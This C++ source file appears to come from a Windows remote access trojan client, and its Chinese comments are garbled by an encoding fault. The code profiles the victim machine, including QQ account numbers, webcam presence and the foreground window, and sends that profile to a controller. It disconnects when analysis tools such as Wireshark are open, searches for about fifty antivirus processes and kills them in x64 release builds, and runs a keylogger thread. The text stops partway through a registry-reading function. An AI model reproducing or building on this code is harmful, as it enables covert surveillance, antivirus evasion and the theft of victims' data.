#include "stdafx.h"
#include "help.h"

#include "KillAv.h"
int sendLoginInfo(ISocketBase* pClient, TCHAR* Time, BOOL sw_user)
{
	int nRet = -1;
	//��ʼ����������
	LOGININFO* LoginInfo = new LOGININFO;
	memset(LoginInfo, 0, sizeof(LOGININFO));
	// ��ʼ��������
	LoginInfo->Btoken = TOKEN_LOGIN; // ����Ϊ��¼
	//����IP
	char n_ip[200] = {};
	char hostname[50] = {};
	memset(hostname, 0, 50);
	gethostname(hostname, sizeof(hostname));
	HOSTENT* host = gethostbyname(hostname);
	if (host != NULL)
	{
		for (int i = 0; ; i++)
		{
			strcat_s(n_ip, 200, inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]));
			strcat_s(n_ip, 200, " ");
			if (host->h_addr_list[i] + host->h_length >= host->h_name)
				break;
		}
	}

	int size = MultiByteToWideChar(CP_ACP, 0, n_ip, -1, NULL, 0);
	MultiByteToWideChar(CP_ACP, 0, n_ip, -1, LoginInfo->N_ip, size);
	//mbstowcs(LoginInfo->N_ip, n_ip, 255);

	//�û�����ֹͣʹ��ʱ��
	GetActive(LoginInfo->UserActive);

	//�������+ϵͳ�ͺ�
	size = MultiByteToWideChar(CP_ACP, 0, hostname, -1, NULL, 0);
	MultiByteToWideChar(CP_ACP, 0, hostname, -1, LoginInfo->CptName, size);

	//ϵͳ
	GetNtVersionNumbers(LoginInfo->OSVersion, LoginInfo->OsName);

	//CPU
	SYSTEM_INFO si;
	memset(&si, 0, sizeof(SYSTEM_INFO));
	GetSystemInfo(&si);
	wsprintf(LoginInfo->CPU, _T("%d"), si.dwNumberOfProcessors);

	//Ӳ��+�ڴ�
	GetDiskAndMem(LoginInfo->DAM);

	//�Կ�  ��ʾ��
	getgpuandMonitor(LoginInfo->GPU, LoginInfo->Monitors);

	//��ȡǰ������
	getactivewindows(LoginInfo->Window);


	//����
	if (1 > ReadRegEx(HKEY_CURRENT_USER, sw_user ? _T("AppEvents") : _T("Network"), _T("GROUP"), REG_SZ, LoginInfo->Group, NULL, lstrlen(LoginInfo->Group) * sizeof(TCHAR), 2))
		_tcscpy_s(LoginInfo->Group, MyInfo.szGroup);

	//�汾
	_tcscpy_s(LoginInfo->Version, MyInfo.szVersion);

	//��ע
	if (1 > ReadRegEx(HKEY_CURRENT_USER, sw_user ? _T("AppEvents") : _T("Network"), _T("REMARK"), REG_SZ, LoginInfo->Remark, NULL, lstrlen(LoginInfo->Remark) * sizeof(TCHAR), 2))
		_tcscpy_s(LoginInfo->Remark, MyInfo.Remark);


	//�ͻ���λ��
#ifdef _WIN64
	wsprintf(LoginInfo->ExeAndOs, _T("X64 %s"), IsWindowsX64() ? _T("x64") : _T("x86"));
#else
	wsprintf(LoginInfo->ExeAndOs, _T("X86 %s"), IsWindowsX64() ? _T("x64") : _T("x86"));
#endif

	//����Ȩ���û�
	GetProcessIntegrity(LoginInfo);

	GetProcessFullPath(GetCurrentProcessId(), LoginInfo->ProcPath);

	//����ͷ
	IsWebCam() ? _tcscpy_s(LoginInfo->IsWebCam, _T("��")) : _tcscpy_s(LoginInfo->IsWebCam, _T("X"));

	//���ű�־
	LoginInfo->backdoor = sw_user;

	//qq�ŵ�
	GetQQ(LoginInfo->Chat);

	//ɱ�����
	wcsncpy_s(LoginInfo->Virus, ARRAYSIZE(LoginInfo->Virus), GetVirus(), ARRAYSIZE(LoginInfo->Virus) - 1);

	//����ʱ�� ����ʱ��
	DWORD iRunTime = GetTickCount();
	time_t nowTime;
	time(&nowTime);
	time_t systemUpTime = nowTime - (iRunTime / 1000);
	struct tm* timeInfo;
	timeInfo = localtime(&systemUpTime);
	wsprintf(LoginInfo->m_Time, _T("��:%s ��:%d.%d.%d %d:%d:%d"), Time,  timeInfo->tm_year + 1900,
		timeInfo->tm_mon + 1, timeInfo->tm_mday, timeInfo->tm_hour,
		timeInfo->tm_min, timeInfo->tm_sec);

	//ϵͳ����
	GetLocaleInfoW(LOCALE_SYSTEM_DEFAULT, LOCALE_SLANGUAGE, LoginInfo->lpLCData, sizeof(LoginInfo->lpLCData)); //������Ҫ��UNICODE

	//��ʾ����Ϣ
	/*CMultiMonitorEnumerator mMultDisplayEnum;
	mMultDisplayEnum.GetMonitors(LoginInfo->Monitors);*/

	//ϵͳĿ¼
	GetSystemDirectory((LPTSTR)(LPCTSTR)LoginInfo->szSysdire, 50);

	//ΨһID
	HW_PROFILE_INFO hwProfileInfo;
	if (GetCurrentHwProfile(&hwProfileInfo))
	{
#ifdef _WIN64
		BufToMd5(LoginInfo->szHWID, LoginInfo->CptName, LoginInfo->OSVersion, LoginInfo->N_ip, LoginInfo->CPU, _T("X64"), LoginInfo->Process, hwProfileInfo.szHwProfileGuid);
#else
		BufToMd5(LoginInfo->szHWID, LoginInfo->CptName, LoginInfo->OSVersion, LoginInfo->N_ip, LoginInfo->CPU, _T("X86"), LoginInfo->Process, hwProfileInfo.szHwProfileGuid);
#endif
	}
	else
	{
#ifdef _WIN64
		BufToMd5(LoginInfo->szHWID, LoginInfo->CptName, LoginInfo->OSVersion, LoginInfo->N_ip, LoginInfo->CPU, _T("X64"), LoginInfo->Process);
#else
		BufToMd5(LoginInfo->szHWID, LoginInfo->CptName, LoginInfo->OSVersion, LoginInfo->N_ip, LoginInfo->CPU, _T("X86"), LoginInfo->Process);
#endif
	}


	nRet=	pClient->Send((LPBYTE)LoginInfo, sizeof(LOGININFO));
	SAFE_DELETE(LoginInfo);

	return nRet;
}




VOID BufToMd5(TCHAR* a, TCHAR* b, TCHAR* c, TCHAR* d, TCHAR* e, TCHAR* f, TCHAR* g, TCHAR* h)
{
	std::wstring st_temp;
	st_temp += b;
	if (c)  st_temp += c;
	if (d)  st_temp += d;
	if (e)  st_temp += e;
	if (f)  st_temp += f;
	if (g)  st_temp += g;
	if (h)  st_temp += h;
	string s_tmp = MD5((void*)st_temp.data(), (st_temp.length() + 1) * sizeof(TCHAR)).toString();
	int size = MultiByteToWideChar(CP_ACP, 0, s_tmp.c_str(), -1, NULL, 0);
	MultiByteToWideChar(CP_ACP, 0, s_tmp.c_str(), -1, a, size);

}


//��ȡǰ������
void getactivewindows(TCHAR* str)
{
	HWND hFocus = NULL;
	hFocus = GetForegroundWindow();
	if (hFocus)
	{
		GetWindowText(
			hFocus,					// ���ھ��
			str,		// ���մ��ڱ���Ļ�����ָ��
			250			// �������ֽڴ�С
		);
	}
}





bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{

	if (NULL == hwnd)
	{
		return FALSE;
	}
	if (!IsWindowVisible(hwnd))
		return true;

	BOOL* ret = (BOOL*)lParam;
	TCHAR* strTitle = new TCHAR[1024];
	::memset(strTitle, 0, sizeof(strTitle));
	::GetWindowText(hwnd, strTitle, 1000);
	if (_tcsstr(strTitle, _T("����")) ||
		_tcsstr(strTitle, _T("ApateDNS")) ||
		_tcsstr(strTitle, _T("Malwarebytes")) ||
		_tcsstr(strTitle, _T("TCPEye")) ||
		_tcsstr(strTitle, _T("TaskExplorer")) ||
		_tcsstr(strTitle, _T("CurrPorts")) ||
		_tcsstr(strTitle, _T("Port")) ||
		_tcsstr(strTitle, _T("Metascan")) ||
		_tcsstr(strTitle, _T("Wireshark")) ||
		_tcsstr(strTitle, _T("���������")) ||
		_tcsstr(strTitle, _T("��Դ������")) ||
		_tcsstr(strTitle, _T("�������")) ||
		_tcsstr(strTitle, _T("Fiddler")) ||
		_tcsstr(strTitle, _T("����")) ||
		_tcsstr(strTitle, _T("Capsa")) ||
		_tcsstr(strTitle, _T("Sniff")) ||
		_tcsstr(strTitle, _T("Capsa")) ||
		_tcsstr(strTitle, _T("Process")) ||
		_tcsstr(strTitle, _T("��ʾ��")))

	{
		*ret = TRUE;
		SAFE_DELETE_AR(strTitle);
		return FALSE;
	}
	else
	{
		SAFE_DELETE_AR(strTitle);
		return TRUE;
	}

	return TRUE;
}

BOOL AntiCheck()
{
	BOOL ret = FALSE;
	EnumWindows((WNDENUMPROC)EnumWindowsProc, LPARAM(&ret));
	return ret;
}

unsigned int __stdcall AntiCheckThread(LPVOID lparam)
{
	CLoginManager* manager = (CLoginManager*)lparam;
	while (manager->IsConnect())
	{
		if (AntiCheck())
		{
			manager->Disconnect();
			return 0;
		}
		Sleep(3000);
	}
	return 0;
}


AYSDFE g_Ayadfe_Datas[50] =
{
	{_T("360Safe.exe"),				_T("360")},
	{_T("360Safe.exe"),				_T("360")},
	{_T("360Tray.exe"),				_T("360")},
	{_T("360tray.exe"),				_T("360")},
	{_T("ZhuDongFangYu.exe"),		_T("360")},
	{_T("360sd.exe"),				_T("360")},
	{_T("kxetray.exe"),				_T("��ɽ")},
	{_T("KSafeTray.exe"),			_T("��ɽ")},
	{_T("kscan.exe"),				_T("��ɽ")},
	{_T("kwsprotect64.exe"),		_T("��ɽ")},
	{_T("kxescore.exe"),			_T("��ɽ")},
	{_T("QQPCRTP.exe"),				_T("q��")},
	{_T("QMDL.exe"),				_T("q��")},
	{_T("QMPersonalCenter.exe"),	_T("q��")},
	{_T("QQPCPatch.exe"),			_T("q��")},
	{_T("QQPCRealTimeSpeedup.exe"),	_T("q��")},
	{_T("QQPCTray.exe"),			_T("q��")},
	{_T("QQRepair.exe"),			_T("q��")},
	{_T("HipsTray.exe"),			_T("����")},
	{_T("HipsMain.exe"),			_T("����")},
	{_T("HipsDaemon.exe"),			_T("����")},
	{_T("BaiduSd.exe"),				_T("�ٶ�ɱ��")},
	{_T("baiduSafeTray.exe")		_T("�ٶ���ʿ")},
	{_T("KvMonXP.exe"),				_T("����")},
	{_T("RavMonD.exe"),				_T("����")},
	{_T("QUHLPSVC.EXE"),			_T("QuickHeal")},   //ӡ��
	{_T("mssecess.exe"),			_T("΢��MSE")},
	{_T("cfp.exe"),					_T("Comodoɱ��")},
	{_T("SPIDer.exe"),				_T("DR.WEB")},      //��֩��
	{_T("acs.exe"),					_T("Outpost")},
	{_T("V3Svc.exe"),				_T("����ʿV3")},
	{_T("AYAgent.aye"),				_T("��������")},
	{_T("avgwdsvc.exe"),			_T("AVG")},
	{_T("f-secure.exe"),			_T("F-Secure")},    //�Ұ�ȫ
	{_T("avp.exe"),					_T("����")},
	{_T("avpui.exe"),				_T("����")},
	{_T("Mcshield.exe"),			_T("�󿧷�")},
	{_T("egui.exe"),				_T("NOD32")},
	{_T("knsdtray.exe"),			_T("��ţ")},
	{_T("TMBMSRV.exe"),				_T("����")},
	{_T("avcenter.exe"),			_T("С��ɡ")},
	{_T("ashDisp.exe"),				_T("Avast���簲ȫ")},
	{_T("rtvscan.exe"),				_T("ŵ��")},
	{_T("remupd.exe"),				_T("��è��ʿ")},
	{_T("vsserv.exe"),				_T("BitDefender")}, //BD  bdagent.exe
	{_T("PSafeSysTray.exe"),		_T("PSafe������")}, //����
	{_T("ad-watch.exe"),			_T("Ad-watch�����")},
	{_T("K7TSecurity.exe"),			_T("K7ɱ��")},
	{_T("UnThreat.exe"),			_T("UnThreat")},    //��������
	{_T("  "),						_T("  ")}
};

BOOL GetOpenKeyLoggerReg()
{
	TCHAR tc_temp[50] = {};
	if (ReadRegEx(HKEY_CURRENT_USER, _T("key"), _T("open"), REG_SZ, tc_temp, NULL, lstrlen(tc_temp) * sizeof(TCHAR), 2))
	{
		if (!lstrcmp(tc_temp, _T("1")))
			return TRUE;
	}
	return FALSE;
}


unsigned int __stdcall KeyLogger(LPVOID lparam)
{
	HANDLE hObject;
	do
	{
		hObject = CreateMutex(NULL, FALSE, MyInfo.Remark); //������
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			do
			{
				if (MyInfo.otherset.IsKeyboard || GetOpenKeyLoggerReg())  //�ȴ���Ȩ
				{
					if (!Input::initialize(GetConsoleWindow(), GetModuleHandle(NULL)))
						return 0;
					Input::savekerboard();
				}
				Sleep(1000);
			} while (TRUE);
		}
		Sleep(1000);
	} while (TRUE);

	return 0;
}

void GetTimeFormat(TCHAR* Time)
{
	SYSTEMTIME stTime;
	GetLocalTime(&stTime);
	WORD wYear = stTime.wYear;
	WORD wMonth = stTime.wMonth;
	WORD wDay = stTime.wDay;
	WORD wHour = stTime.wHour;
	WORD wMinute = stTime.wMinute;
	WORD wSecond = stTime.wSecond;
	wsprintf(Time, _T("%4d.%2d.%2d-%2d:%2d:%2d"), wYear, wMonth, wDay, wHour, wMinute, wSecond);
}


DWORD GetProcessID(LPCWSTR lpProcessName)
{
	HANDLE			hProcessSnap = NULL;
	PROCESSENTRY32	pe32 = { 0 };

	// ��ȡϵͳ���̿���
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return 0;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	for (BOOL bPE32 = Process32First(hProcessSnap, &pe32); bPE32; bPE32 = Process32Next(hProcessSnap, &pe32))
	{
		if (wcscmp(pe32.szExeFile, lpProcessName) == 0)
		{
			CloseHandle(hProcessSnap);
			return pe32.th32ProcessID;
		}
	}
	CloseHandle(hProcessSnap);
	return 0;
}

TCHAR* GetVirus()
{
	static TCHAR AllName[255];
	int t = 0;
	memset(AllName, 0, sizeof(AllName));

	while (1)
	{
		if (_tcsstr(g_Ayadfe_Datas[t].Course, _T(" ")) == 0)
		{
			if (GetProcessID(g_Ayadfe_Datas[t].Course))
			{
#ifdef _WIN64
#ifndef _DEBUG
				FuckOffProcessByName(g_Ayadfe_Datas[t].Course);
#endif
#endif
				lstrcat(AllName, g_Ayadfe_Datas[t].Name);
				lstrcat(AllName, _T(" "));
			}
		}
		else
			break;
		t++;
	}


	CComPtr< ICatInformation > pInfo;
	HRESULT hr = pInfo.CoCreateInstance(CLSID_StdComponentCategoriesMgr);
	if (SUCCEEDED(hr))
	{
		const CATID IDs[1] = { 0x56ffcc30, 0xd398, 0x11d0, 0xb2, 0xae, 0x0, 0xa0, 0xc9, 0x8, 0xfa, 0x49 };
		CComPtr< IEnumCLSID > pEnum;
		hr = pInfo->EnumClassesOfCategories(1, IDs, 0, NULL, &pEnum);
		if (SUCCEEDED(hr))
		{
			CLSID clsid;
			while (pEnum->Next(1, &clsid, NULL) == S_OK)
			{

				TCHAR sCLSID[MAX_PATH] = {};
				wsprintf(sCLSID, _T("CLSID\\{%.8X-%.4X-%.4X-%.2X%.2X-%.2X%.2X%.2X%.2X%.2X%.2X}"),
					clsid.Data1, clsid.Data2, clsid.Data3,
					clsid.Data4[0], clsid.Data4[1], clsid.Data4[2], clsid.Data4[3],
					clsid.Data4[4], clsid.Data4[5], clsid.Data4[6], clsid.Data4[7]);

				HKEY hClass = NULL;

				if (ERROR_SUCCESS == RegOpenKeyEx(HKEY_CLASSES_ROOT, sCLSID, 0, KEY_READ, &hClass))
				{
					// Get it name
					TCHAR szValue[MAX_PATH] = {};
					DWORD nValue = MAX_PATH, nType = REG_SZ;
					if (ERROR_SUCCESS == RegQueryValueEx(hClass, NULL, NULL, &nType, (LPBYTE)szValue, &nValue))
					{
						lstrcat(AllName, szValue);
						lstrcat(AllName, _T(" "));
					}
					RegCloseKey(hClass);
				}
			}
		}
	}
	if (lstrlen(AllName) == 0)
	{
		lstrcat(AllName, _T("N"));
	}

	return AllName;
}


// �û�״̬
void GetActive(TCHAR* UserActive)
{
	LASTINPUTINFO lpi;
	lpi.cbSize = sizeof(lpi);
	GetLastInputInfo(&lpi);//��ȡ�ϴ����������ʱ�䡣
	int stoptime = ((::GetTickCount() - lpi.dwTime) / 1000 / 60);
	wsprintf(UserActive, _T("%d min"), stoptime);


}


BOOL GetQQ(TCHAR* m_qq)
{
	TCHAR QQ[255] = { 0 };

	HKEY	hKey;			//ע����ؾ��
	LPSTR		lpszUserSid = NULL;
	const	TCHAR* subKey = _T("Software\\Tencent\\Plugin\\VAS"); //��Ҫ�򿪵�ע�������	
	if (RegOpenKeyEx(HKEY_CURRENT_USER, subKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)//��
	{
		DWORD dwIndex = 0, NameCnt, NameMaxLen;
		DWORD KeySize, KeyCnt, KeyMaxLen, DataMaxLen;
		//�����ö����
		if (RegQueryInfoKey(hKey, NULL, NULL, NULL, &KeyCnt, &KeyMaxLen, NULL, &NameCnt, &NameMaxLen, &DataMaxLen, NULL, NULL) != ERROR_SUCCESS)
		{
			return NULL;
		}
		//һ�㱣����ʩ
		KeySize = KeyMaxLen + 1;
		if (KeyCnt > 0 && KeySize > 1)
		{
			TCHAR tmp[255] = {};
			for (dwIndex = 0; dwIndex < KeyCnt; dwIndex++)		//ö����
			{
				ZeroMemory(tmp, ARRAYSIZE(tmp));
				DWORD i = KeySize;
				RegEnumKeyEx(hKey, dwIndex, tmp, &i, NULL, NULL, NULL, NULL);
				if ((lstrlen(tmp) < 12) && (lstrlen(tmp) > 5))
				{
					wcscat_s(QQ, tmp);
					wcscat_s(QQ, _T(" \n"));
				}
			}
			RegCloseKey(hKey);
		}
	}

	if (lstrlen(QQ) > 4)
	{
		wcsncpy_s(m_qq, 215, QQ, 215-1);
		return TRUE;
	}
	else
		return FALSE;
}

//ö����Ƶ�豸
//////////////////////////////////////////////////////////
UINT EnumDevices()
{
	UINT nCam = 0;
	CoInitialize(NULL);    //COM ���ʼ��
	/////////////////////    Step1        /////////////////////////////////
	//ö�ٲ����豸
	ICreateDevEnum* pCreateDevEnum;                          //�����豸ö����
	//�����豸ö�ٹ�����
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //Ҫ������Filter��Class ID
		NULL,                                                //��ʾFilter�����ۺ�
		CLSCTX_INPROC_SERVER,                                //����������COM����
		IID_ICreateDevEnum,                                  //��õĽӿ�ID
		(void**)&pCreateDevEnum);                            //�����Ľӿڶ����ָ��
	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker* pEm;                 //ö�ټ�����ӿ�
	//��ȡ��Ƶ���ö����
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	//������ȡ��Ƶ���ö��������ʹ�����´���
	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //����ö������λ
	ULONG cFetched;
	IMoniker* pM;                                            //������ӿ�ָ��
	while (hr = pEm->Next(1, &pM, &cFetched), hr == S_OK)       //��ȡ��һ���豸
	{
		IPropertyBag* pBag;                                  //����ҳ�ӿ�ָ��
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void**)&pBag);
		//��ȡ�豸����ҳ
		if (SUCCEEDED(hr))
		{
			VARIANT var;
			var.vt = VT_BSTR;                                //������Ƕ���������
			hr = pBag->Read(L"FriendlyName", &var, NULL);
			//��ȡFriendlyName��ʽ����Ϣ
			if (hr == NOERROR)
			{
				nCam++;
				SysFreeString(var.bstrVal);   //�ͷ���Դ���ر�Ҫע��
			}
			pBag->Release();                  //�ͷ�����ҳ�ӿ�ָ��
		}
		pM->Release();                        //�ͷż�����ӿ�ָ��
	}
	CoUninitialize();                   //ж��COM��
	return nCam;
}
//////////////////////////////////////////////////////////

bool IsWebCam()
{
	bool	bRet = false;

	if (EnumDevices() > 0)
	{
		bRet = TRUE;
	}
	return bRet;
}


BOOL GetProcessUserName(TCHAR* strProcessUser)
{
	HANDLE hProcess = ::GetCurrentProcess();
	HANDLE hToken = NULL;
	BOOL bFuncReturn = FALSE;
	PTOKEN_USER pToken_User = NULL;
	DWORD dwTokenUser = 0;
	TCHAR szAccName[MAX_PATH] = { 0 };
	TCHAR szDomainName[MAX_PATH] = { 0 };
	HANDLE hProcessToken = NULL;
	if (hProcess != NULL)
	{
		// ���������̵�Ȩ��
		bFuncReturn = ::OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
		if (bFuncReturn == 0) // ʧ��
			return FALSE;

		if (hToken != NULL)
		{
			::GetTokenInformation(hToken, TokenUser, NULL, 0L, &dwTokenUser);
			if (dwTokenUser > 0)
			{
				pToken_User = (PTOKEN_USER)::GlobalAlloc(GPTR, dwTokenUser);
			}

			if (pToken_User != NULL)
			{
				bFuncReturn = ::GetTokenInformation(hToken, TokenUser, pToken_User, dwTokenUser, &dwTokenUser);
			}

			if (bFuncReturn != FALSE && pToken_User != NULL)
			{
				SID_NAME_USE eUse = SidTypeUnknown;
				DWORD dwAccName = 0L;
				DWORD dwDomainName = 0L;
				PSID  pSid = pToken_User->User.Sid;
				bFuncReturn = ::LookupAccountSid(NULL, pSid, NULL, &dwAccName,
					NULL, &dwDomainName, &eUse);

				if (dwAccName > 0 && dwAccName < MAX_PATH && dwDomainName>0 && dwDomainName <= MAX_PATH)
				{
					bFuncReturn = ::LookupAccountSid(NULL, pSid, szAccName, &dwAccName,
						szDomainName, &dwDomainName, &eUse);
				}

				if (bFuncReturn != 0)
					lstrcpy(strProcessUser, szAccName);

			}
		}
	}

	if (pToken_User != NULL)
		::GlobalFree(pToken_User);

	if (hToken != NULL)
		::CloseHandle(hToken);

	return TRUE;
}

BOOL GetLogonFromToken(HANDLE hToken, _bstr_t& strUser, _bstr_t& strdomain)
{
#define MAX_NAME 256
	DWORD dwSize = MAX_NAME;
	BOOL bSuccess = FALSE;
	DWORD dwLength = 0;
	strUser = _T("");
	strdomain = _T("");
	PTOKEN_USER ptu = NULL;
	//��֤����Ĳ�����Ϊ NULL��
	if (NULL == hToken)
		goto Cleanup;

	if (!GetTokenInformation(
		hToken,         // handle to the access token
		TokenUser,    // get information about the token's groups 
		(LPVOID)ptu,   // pointer to PTOKEN_USER buffer
		0,              // size of buffer
		&dwLength       // receives required buffer size
	))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			goto Cleanup;

		ptu = (PTOKEN_USER)HeapAlloc(GetProcessHeap(),
			HEAP_ZERO_MEMORY, dwLength);

		if (ptu == NULL)
			goto Cleanup;
	}

	if (!GetTokenInformation(
		hToken,         // handle to the access token
		TokenUser,    // get information about the token's groups 
		(LPVOID)ptu,   // pointer to PTOKEN_USER buffer
		dwLength,       // size of buffer
		&dwLength       // receives required buffer size
	))
	{
		goto Cleanup;
	}
	SID_NAME_USE SidType;
	TCHAR lpName[MAX_NAME];
	TCHAR lpDomain[MAX_NAME];

	if (!LookupAccountSid(NULL, ptu->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType))
	{
		DWORD dwResult = GetLastError();
		if (dwResult == ERROR_NONE_MAPPED)
			_tcscpy_s(lpName, _T("NONE_MAPPED"));
		else
		{
			return FALSE;
		}
	}
	else
	{
		/*	printf("Current user is  %s\\%s\n",
				lpDomain, lpName);*/

		strUser = lpName;
		strdomain = lpDomain;
		bSuccess = TRUE;
	}

Cleanup:

	if (ptu != NULL)
		HeapFree(GetProcessHeap(), 0, (LPVOID)ptu);
	return bSuccess;
}

HRESULT GetUserFromProcess(TCHAR* temp)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	if (hProcess == NULL)
		return E_FAIL;
	HANDLE hToken = NULL;

	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
	{
		CloseHandle(hProcess);
		return E_FAIL;
	}
	_bstr_t strUser, strdomain;
	BOOL bres = GetLogonFromToken(hToken, strUser, strdomain);
	//memcpy(temp, strUser.GetBSTR(), strUser.length() * sizeof(TCHAR) + sizeof(TCHAR));
	memcpy(temp, strUser.GetBSTR(), (strUser.length() > 30) ? strUser.length() : 30 * sizeof(TCHAR));
	CloseHandle(hToken);
	CloseHandle(hProcess);
	return bres ? S_OK : E_FAIL;
}

//���̼���
BOOL GetProcessIntegrity(LOGININFO* temp)
{
	TCHAR* NowUser = new TCHAR[30];
	//������PID
	DWORD Pid = GetCurrentProcessId();

	wsprintf(temp->pid, _T("%d"), Pid);
	//��ǰ�û�
	GetUserFromProcess(NowUser);

	DWORD dwRet = 0;
	OSVERSIONINFOEX VersionInfo;
	ZeroMemory(&VersionInfo, sizeof(VersionInfo));
	VersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if (GetVersionEx((LPOSVERSIONINFO)&VersionInfo))
	{
		if (VersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT && VersionInfo.dwMajorVersion > 5)
		{
			HANDLE hToken = NULL;
			if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
			{
				DWORD dwSize = 0;
				if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize) &&
					GetLastError() == ERROR_INSUFFICIENT_BUFFER)
				{
					PTOKEN_MANDATORY_LABEL TokenInfo = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, (ULONG)(dwSize));
					if (TokenInfo)
					{
						if (GetTokenInformation(hToken, TokenIntegrityLevel, TokenInfo, dwSize, &dwSize))
						{
							dwRet = *GetSidSubAuthority(TokenInfo->Label.Sid, (DWORD)(*GetSidSubAuthorityCount(TokenInfo->Label.Sid) - 1));

						}
						LocalFree(TokenInfo);
					}
				}
				CloseHandle(hToken);
			}
		}

	}

	switch (dwRet)
	{
	case SECURITY_MANDATORY_LOW_RID:
	{
		wsprintf(temp->Process, _T("��/%s"), NowUser);
	}
	break;
	case SECURITY_MANDATORY_MEDIUM_RID:
	{
		wsprintf(temp->Process, _T("��/%s"),  NowUser);
	}
	break;
	case SECURITY_MANDATORY_HIGH_RID:
	{
		wsprintf(temp->Process, _T("��/%s"), NowUser);
	}
	break;
	case SECURITY_MANDATORY_SYSTEM_RID:
	{
		wsprintf(temp->Process, _T("ϵͳ/%s"), NowUser);
	}
	break;
	case 0:
	{
		wsprintf(temp->Process, _T("None/%s"),  NowUser);
	}
	break;
	default:
		break;
	}
	SAFE_DELETE_AR(NowUser);
	return TRUE;
}

// �ڴ�
void GetDiskAndMem(TCHAR* pBuf)
{
	ULARGE_INTEGER nTotalBytes, nTotalFreeBytes, nTotalAvailableBytes;
	ULONG nAllGB = 0, nFreeGB = 0;
	DWORD drivertype;
	TCHAR driver[10];
	int n_disk = 0;
	for (int i = 0; i < 26; i++)
	{
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;

		drivertype = GetDriveType(driver);
		if (drivertype != DRIVE_FIXED)
			continue;
		n_disk++;
		GetDiskFreeSpaceEx(driver, &nTotalAvailableBytes, &nTotalBytes, &nTotalFreeBytes);
		nAllGB = nAllGB + ULONG(nTotalBytes.QuadPart / 1024 / 1024 / 1024);
		nFreeGB = nFreeGB + ULONG(nTotalFreeBytes.QuadPart / 1024 / 1024 / 1024);
	}
	//wsprintf(pBuf, _T("Ӳ�� �� %d G ���� %d G \n"), nAllGB, nFreeGB);

	TCHAR szMemory[MAX_PATH] = { 0, };
	MEMORYSTATUSEX		Meminfo;

	memset(&Meminfo, 0, sizeof(Meminfo));
	Meminfo.dwLength = sizeof(Meminfo);
	GlobalMemoryStatusEx(&Meminfo);

	unsigned __int64	dSizeTotal = (unsigned __int64)Meminfo.ullTotalPhys / 1024 / 1024 / 1024 + 1; //���ڴ�
	unsigned __int64	dSize_Avail = (unsigned __int64)Meminfo.ullAvailPhys / 1024 / 1024 / 1024 + 1; //�����ڴ�

	swprintf_s(pBuf, 200, _T("HDD:%d��  %d Gb Free %d Gb  Mem: %d Gb "), n_disk, nAllGB, nFreeGB, dSizeTotal);
	swprintf_s(pBuf, 200, _T("%sFree%d Gb "), pBuf, dSize_Avail);


}



//��ȡע����ָ����������
int  ReadRegEx(HKEY MainKey, LPCTSTR SubKey, LPCTSTR Vname, DWORD Type, TCHAR* szData, LPBYTE szBytes, DWORD lbSize, int Mode)
{
	HKEY   hKey;
	int     iResult = 0;
	TCHAR   KeyName[32], ValueSz[MAX_PATH], ValueTemp[MAX_PATH];
	DWORD  szSize, dwIndex = 0;
	memset(KeyName, 0, sizeof(KeyName));
	memset(ValueSz, 0, sizeof(ValueSz));
	memset(ValueTemp, 0, sizeof(ValueTemp));
	__try
	{
		if (RegOpenKeyEx(MainKey, SubKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
		{
			iResult = -1;
			__leave;
		}
		switch (Mode)
		{
		case 0:
			switch (Type)
			{
			case REG_SZ:
			case REG_EXPAND_SZ:
				szSize = sizeof(ValueSz);
				if (RegQueryValueEx(hKey, Vname, NULL, &Type, (LPBYTE)ValueSz, &szSize) == ERROR_SUCCESS)
				{
					SYSTEM_INFO SysInfo; // ���ڻ�ȡCPU������
					GetSystemInfo(&SysInfo);
					wsprintf(ValueSz, _T("%s-%d��"), ValueSz, SysInfo.dwNumberOfProcessors);
					lstrcpy(szData, ValueSz);
					iResult = 1;
				}
				else
					lstrcpy(szData, _T("error"));
				break;
			}
			break;


		case 1:
			switch (Type)
			{
			case REG_SZ:
			case REG_EXPAND_SZ:
				szSize = sizeof(ValueSz);
				if (RegQueryValueEx(hKey, Vname, NULL, &Type, (LPBYTE)ValueSz, &szSize) == ERROR_SUCCESS)
				{
					lstrcpy(szData, ValueSz);
					iResult = 1;
				}
				else
					lstrcpy(szData, _T("error"));
				break;
			}
			break;
		case 2:
			switch (Type)
			{
			case REG_SZ:
			case REG_EXPAND_SZ:
				szSize = sizeof(ValueSz);
				if (RegQueryValueEx(hKey, Vname, NULL, &Type, (LPBYTE)ValueSz, &szSize) == ERROR_SUCCESS)
				{
					if (lstrcmp(ValueSz, _T("")) == 0)
					{
						iResult = -1;
						__leave;
					}
					lstrcpy(szData, ValueSz);

					iResult = 1;
				}
				else
					iResult = 0;
				break;
			}
			break;


		default:
			break;
		}


	}
